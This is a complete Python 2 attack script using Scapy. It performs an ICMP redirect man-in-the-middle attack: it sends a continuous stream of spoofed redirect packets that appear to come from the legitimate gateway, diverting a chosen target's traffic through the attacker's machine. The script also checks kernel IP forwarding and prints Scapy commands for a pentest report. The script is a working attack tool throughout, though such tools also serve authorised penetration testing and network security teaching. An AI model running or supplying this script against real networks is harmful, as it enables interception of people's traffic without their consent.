#!/usr/bin/env python
##############################################################################
# ICMPRedirect.py - script to perform ICMP redirect attacks                  #
# May 2012 - Nicolas Biscos (buffer at 0x90 period fr )                      #
#                                                                            #
# This program is free software: you can redistribute it and/or modify       #
# it under the terms of the GNU General Public License as published by       #
# the Free Software Foundation, either version 3 of the License, or          #
# (at your option) any later version.                                        #
#                                                                            #
# This program is distributed in the hope that it will be useful,            #
# but WITHOUT ANY WARRANTY; without even the implied warranty of             #
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the               #
# GNU General Public License for more details.                               #
#                                                                            #
# This should have received a copy of the GNU General Public License         #
# along with this program. If not, see <http://www.gnu.org/licenses/>.       #
##############################################################################

# Suppress scapy complaints
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from getopt import getopt
from getopt import GetoptError
import sys

##############################################################################
# Display help message                                                       #
##############################################################################
def doHelp():
   print """
ICMPRedirect.py - Perform ICMP Redirect MITM attack. Please ensure that the attacker's 
                  machine perform packet forwarding before using this script, to avoid 
                  DoS conditions

Syntax: ICMPRedirect.py [-v] [-i iface] [-h] [--interval=int] -g gateway -t target
   -v              verbose mode. Displays Scapy code used for pentest report :)
   -i iface        interface to perform attack on
   -h              display this message and exits
   --interface=int interval in secs before resending packet (defaulting to 2)
   -g gw           address of the legitimate gateway
   -t target       target of this attack.
"""


##############################################################################
# This simply display what Scapy commands are executed. Can be useful for a  #
# pentest report :)                                                          #
#                                                                            #
##############################################################################
def log(verbose, gw, target, iface):
   if( not verbose ):
      return
   print """
>>> gw = '%s'
>>> target = '%s'
>>> ip = IP()
>>> ip.src = gw
>>> ip.dst = target
>>> ip.show2()
""" % (gw, target);
   IP(src=gw, dst=target).show2();
   print """
>>> icmp = ICMP()
>>> icmp.type = 5
>>> icmp.code = 1
>>> icmp.gw = get_if_addr(iface)
>>> icmp.show2()
""";
   ICMP(type=5, code=1, gw=get_if_addr(iface)).show2();
   print """
>>> ip2 = IP()
>>> ip2.src = target
>>> ip2.dst = gw
>>> ip2.show()
""";
   IP(src=target, dst=gw).show2();
   print """
>>> send(ip/icmp/ip2/UDP(), loop=1, inter=2)
"""

##############################################################################
# Check that packet forwarding is activated at kernel level                  #
##############################################################################
def isForwarding():
   forwarding = open('/proc/sys/net/ipv4/ip_forward').read(1);
   if( 0 == int(forwarding) ):
      print '-E- Forwarding deactivated. Please enable it: sudo sysctl -w net.ipv4.ip_forward=1'
      sys.exit(-1);


##############################################################################
# Parse command line arguments                                               #
##############################################################################
def parseArgs():
   verbose = False;
   iface = conf.iface;
   target = None;
   gw = None;
   interval = 2;

   try:
      opts, targetList = getopt(sys.argv[1:], 'vi:g:t:h', ['verbose', 'interface=', 'gateway=', 'target=', 'help', 'interval=']);
     
      for k, v in opts:
         if( '-v' == k or '--verbose' == k ):
            verbose = True;
         elif( '-i' == k or '--interface' == k ):
            iface = v;
         elif( '-g' == k or '--gateway' == k ):
            gw = v;
         elif( '-t' == k or '--target' == k ):
            target = v;
         elif( '--interval' == k ):
            interval = float(v);
         elif( '-h' == k or '--help' == k ):
            doHelp();
            sys.exit(0);
   except GetoptError, e:
      print '-E- %s' % str(e)
      sys.exit(-1);

   if( not target or not gw ):
      print '-E- Must define target and gateway'
      sys.exit(-1);

   return verbose, iface, target, gw, interval

##############################################################################
# Main - check command line arguments and if redirect is enable at kernel    #
# level and perform continuous poisonning until user Ctrl^C the script       #
##############################################################################
if( '__main__' == __name__ ):
   conf.verb=0;

   verbose, iface, target, gw, interval = parseArgs();
   isForwarding();

   import signal
   import sys
   def signal_handler(signal, frame):
      print '\n-I- Ended poisonning'
      sys.exit(0)
   signal.signal(signal.SIGINT, signal_handler)

   try:
      log(verbose, gw, target, iface);
      print '-I- Start poisonning...'
      ip = IP();
      ip.src = gw;
      ip.dst = target;
      icmp = ICMP();
      icmp.type = 5;
      icmp.code = 1;
      icmp.gw = get_if_addr(iface)
      ip2 = IP();
      ip2.src = target;
      ip2.dst = gw;
      send(ip/icmp/ip2/UDP(), loop=1, inter=interval, verbose=verbose);
   except KeyboardInterrupt:
      print '-I- Ended poisonning'
      sys.exit(0);
   except Exception, e:
      print '-E- %s' % str(e);

